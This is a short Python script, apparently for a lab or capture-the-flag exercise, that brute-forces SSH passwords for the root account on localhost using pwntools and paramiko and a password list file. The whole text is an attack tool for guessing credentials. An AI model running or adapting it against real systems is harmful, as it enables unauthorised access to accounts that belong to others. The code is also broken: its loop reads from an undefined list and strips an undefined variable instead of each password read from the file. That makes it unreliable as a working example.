from pwn import *
import paramiko

host = "127.0.0.1"
username = "root"
attempts = 0
with open("pass-file.txt","r") as f:
    for f in pwd_list:
        pwd = pwd.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts,pwd))
            res = ssh(host=host, user=username, password=pwd, timeout=1)
            if res.connected():
                print("[+] valid password found: {}".format(pwd))
                res.close()
                break
            res.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[x] invalid passwords!")
        attempts +=1
